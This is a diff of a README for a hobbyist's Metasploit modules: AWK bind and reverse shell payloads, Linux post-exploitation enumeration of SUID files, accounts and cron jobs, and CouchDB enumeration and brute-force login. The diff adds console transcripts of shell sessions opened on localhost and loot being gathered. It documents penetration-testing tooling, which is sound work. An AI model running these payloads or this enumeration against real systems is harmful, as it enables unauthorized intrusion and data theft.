@@ -1,25 +1,25 @@
-## Modules for metasploit. Simple output.
-Some modules that I created for fun.
+## Modules for metasploit
+Some modules that I created for fun. :)
 
 ### bind_awk.rb
 Bind payload via AWK.
 
 Output:
+```
+msf exploit(handler) > set PAYLOAD cmd/unix/bind_awk 
+PAYLOAD => cmd/unix/bind_awk
+msf exploit(handler) > set RHOST 127.0.0.1
+RHOST => 127.0.0.1
+msf exploit(handler) > run
 
----
-### couchdb_enum.rb
-Enum databases on CouchDB.
+[*] Starting the payload handler...
+[*] Started bind handler
+[*] Command shell session 2 opened (127.0.0.1:50523 -> 127.0.0.1:4444) at 2014-10-14 14:02:27 -0300
 
-Output:
+id
+uid=1000(blah) gid=1000(blah) groups=1000(blah)
+```
 
-ToDo
----
-### couchdb_login.rb
-Brute-force login on CouchDB.
-
-Output:
-
-### ToDo
 ---
 ### enum_devices_apple.rb
 Script post-exploitation (linux).
@@ -76,26 +76,66 @@ Safari
 [*] Post module execution completed
 msf post(enum_devices_apple) >
 ```
+
 ---
 ### enum_system.rb
 Find for SUIDs and SGIDs in linux systems.
 
 Output:
+```
+msf exploit(handler) > run
 
-### ToDo
+[*] Started reverse handler on 127.0.0.1:4444 
+[*] Starting the payload handler...
+[*] Command shell session 5 opened (127.0.0.1:4444 -> 127.0.0.1:55287) at 2014-10-14 14:09:09 -0300
+
+^Z
+Background session 5? [y/N]  y
+msf exploit(handler) > use post/linux/gather/enum_system 
+msf post(enum_system) > set SESSION 5
+SESSION => 5
+msf post(enum_system) > run
+
+[+] Info:
+[+] 	Ubuntu 12.04.5 LTS  
+[+] 	Linux msfdevel 3.11.0-26-generic #45~precise1-Ubuntu SMP Tue Jul 15 04:04:35 UTC 2014 i686 i686 i386 GNU/Linux
+[*] Linux version stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_368282.txt
+[*] User accounts stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_741490.txt
+[*] Installed Packages stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_362788.txt
+[*] Running Services stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_321005.txt
+[*] Cron jobs stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_182975.txt
+[*] Disk info stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_961984.txt
+[*] Logfiles stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_763543.txt
+[*] Setuid/setgid files stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_505295.txt
+[*] Post module execution completed
+msf post(enum_system) >
+```
+
 ---
 ### reverse_awk.rb
 Reverse payload via AWK.
 
 Output:
+```
+msf exploit(handler) > set PAYLOAD cmd/unix/reverse_awk 
+PAYLOAD => cmd/unix/reverse_awk
+msf exploit(handler) > set LHOST 127.0.0.1
+LHOST => 127.0.0.1
+msf exploit(handler) > run
 
-### ToDo
+[*] Started reverse handler on 127.0.0.1:4444 
+[*] Starting the payload handler...
+[*] Command shell session 4 opened (127.0.0.1:4444 -> 127.0.0.1:55286) at 2014-10-14 14:06:15 -0300
+
+id
+uid=1000(blah) gid=1000(blah) groups=1000(blah)
+```
+
 ---
 ### hp_enum_perfd.rb
 HP Operations Manager Perfd Environment Scanner
 
 Output:
-
 ```
 msf auxiliary(hp_enum_perfd) > run
 
@@ -112,5 +152,19 @@ msf auxiliary(hp_enum_perfd) > run
 [*] Auxiliary module execution completed
 msf auxiliary(hp_enum_perfd) >
 ```
----
 
+---
+### couchdb_enum.rb
+Enum databases on CouchDB.
+
+Output:
+TODO
+
+---
+### couchdb_login.rb
+Brute-force login on CouchDB.
+
+Output:
+TODO
+
+---
